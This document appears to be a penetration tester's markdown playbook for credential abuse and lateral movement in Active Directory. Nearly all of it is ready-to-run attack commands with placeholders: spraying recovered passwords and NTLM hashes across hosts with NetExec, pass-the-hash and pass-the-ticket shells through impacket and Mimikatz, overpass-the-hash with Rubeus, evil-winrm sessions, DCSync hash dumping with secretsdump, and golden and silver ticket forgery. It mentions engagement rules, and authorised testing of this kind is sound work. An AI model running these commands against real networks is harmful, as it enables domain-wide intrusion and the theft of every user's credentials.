# Credential Abuse & Lateral Movement

## Objective

Leverage recovered credentials, NTLM hashes, and Kerberos tickets to authenticate to remote systems, move laterally across the domain, and gain access to higher-value targets.

---

# 1. Validate Every Credential

Never assume credentials only work on the system where they were found.

Test every recovered password and NTLM hash against all discovered hosts.

Supported protocols:

- SMB
- WinRM
- RDP
- LDAP
- MSSQL
- SSH
- FTP
- VNC
- HTTP/HTTPS applications

Example:

```bash
nxc smb targets.txt -u <USER> -p <PASSWORD>
```

```bash
nxc smb targets.txt -u <USER> -H <NTLM_HASH>
```

---

# 2. Password Reuse

Whenever a new password is recovered:

- Test it against all discovered users.
- Test local authentication.
- Test domain authentication.
- Spray only if engagement rules allow.

Password reuse is extremely common in enterprise environments.

---

# 3. Pass-the-Hash (PTH)

Use recovered NTLM hashes to authenticate without knowing the plaintext password.

## SMB

```bash
nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
```

## WinRM

```bash
nxc winrm <TARGET_IP> -u <USER> -H <NTLM_HASH>
```

## PsExec

```bash
impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
```

## WMIExec

```bash
impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
```

## SMBExec

```bash
impacket-smbexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
```

> **Note:** Some services (such as RDP) generally require plaintext credentials rather than NTLM hashes.

---

# 4. Pass-the-Ticket (PTT)

Authenticate using an existing Kerberos ticket instead of credentials.

## Linux

```bash
export KRB5CCNAME=ticket.ccache
```

Example:

```bash
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_IP>
```

## Windows (Mimikatz)

```text
kerberos::ptt ticket.kirbi
```

Verify:

```cmd
klist
```

---

# 5. Overpass-the-Hash (Pass-the-Key)

Convert an NTLM hash into a Kerberos TGT.

## Mimikatz

```text
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH>
```

## Rubeus

```powershell
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /ptt
```

> Useful when Kerberos authentication is required but only the NTLM hash is available.

---

# 6. Remote Command Execution

Once administrative access is confirmed, obtain an interactive shell.

## WinRM

```bash
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>
```

## PsExec

```bash
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
```

## WMIExec

```bash
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
```

## SMBExec

```bash
impacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>
```

---

# 7. Local Administrator Reuse

Whenever local administrator credentials are recovered:

- Test them against all member servers.
- Test workstations.
- Always try local authentication.

Example:

```bash
nxc smb targets.txt -u Administrator -H <NTLM_HASH> --local-auth
```

---

# 8. Kerberos Ticket Forgery

Once the required keys are obtained, forged Kerberos tickets can be used for persistence and lateral movement.

## Silver Ticket

**Requirements**

- Service account NTLM hash (or AES key)
- Domain SID
- Target SPN

> Provides access to a specific service without contacting the KDC.

---

## Golden Ticket

**Requirements**

- KRBTGT NTLM hash
- Domain SID

> Provides unrestricted Kerberos authentication across the domain.

---

# 9. DCSync

If replication privileges are obtained, dump domain password hashes directly from Active Directory.

```bash
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

> Recover:
>
> - KRBTGT hash
> - Administrator hash
> - Domain user hashes
> - Computer account hashes

---

# 10. BloodHound Re-Enumeration

After every successful privilege escalation or lateral movement:

- Collect BloodHound data again.
- Import the new ZIP file.
- Identify newly available attack paths.

Attack paths frequently change after compromising additional users or systems.

---

# 11. Credential Validation

Whenever credentials or hashes are recovered:

Test:

- SMB
- WinRM
- LDAP
- MSSQL
- RDP
- SSH
- Local authentication

Never rely solely on `nxc` output.

Manually verify administrative access whenever possible.

---

## Tips

- Validate every recovered credential immediately.
- Test passwords before hashes when both are available.
- Keep all recovered NTLM hashes for future Pass-the-Hash attacks.
- Save all Kerberos tickets (`.kirbi` and `.ccache`).
- Re-run BloodHound after each successful compromise.
- Prefer RDP when interactive desktop access is available.
- Test local administrator credentials across every Windows host.

---

- [ ] Validate recovered passwords.

- [ ] Perform DCSync (when permissions allow).

- [ ] Continue credential validation on newly discovered hosts.
